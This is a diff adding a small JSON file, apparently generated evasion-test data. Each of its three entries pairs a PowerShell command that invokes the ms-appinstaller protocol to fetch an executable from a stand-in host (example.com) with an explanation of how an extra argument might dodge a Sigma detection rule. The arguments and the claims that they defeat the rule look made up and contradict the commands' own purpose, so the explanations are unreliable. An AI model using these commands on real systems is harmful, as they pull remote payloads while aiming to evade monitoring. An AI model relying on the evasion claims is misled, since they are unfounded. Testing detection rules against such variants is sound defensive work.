@@ -1,0 +1,14 @@
+[
+  {
+    "output": "start-process \"ms-appinstaller://?source=http://example.com/file.exe\" -ArgumentList \"--no-download\"",
+    "explanation": "Insertion of an argument that modifies the behavior to prevent download, potentially avoiding the 'ms-appinstaller' protocol handler detection."
+  },
+  {
+    "output": "start-process \"ms-appinstaller://?source=http://example.com/file.exe\" -ArgumentList \"--local-only\"",
+    "explanation": "Insertion of an argument that restricts the command to local operations, which may not trigger the Sigma rule's network-related indicators."
+  },
+  {
+    "output": "start-process \"ms-appinstaller://?source=http://example.com/file.exe\" -ArgumentList \"--simulate\"",
+    "explanation": "Insertion of a simulation flag that alters the command's intent, potentially avoiding the detection of actual file download behavior."
+  }
+]
